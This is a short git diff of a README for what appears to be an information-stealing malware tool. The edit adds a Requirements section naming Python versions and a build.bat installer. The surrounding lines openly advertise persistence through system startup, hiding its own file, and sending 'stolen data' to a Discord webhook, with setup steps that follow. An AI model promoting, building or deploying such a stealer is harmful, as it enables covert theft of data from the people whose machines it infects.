@@ -19,7 +19,9 @@ A powerful tool created by **RayWZW** that:
 - **Persistence**: Adds itself to system startup and hides the file.
 - **Easy Setup**: Build and run with a single batch file.
 - **Webhook Logging**: Sends stolen data to a specified Discord webhook.
-
+## Requirements
+pythjon 3.10 - 3.12
+any pip packages in requirements.txt. just run build.bat itll install them
 ## Setup
 
 1. Clone this repository:
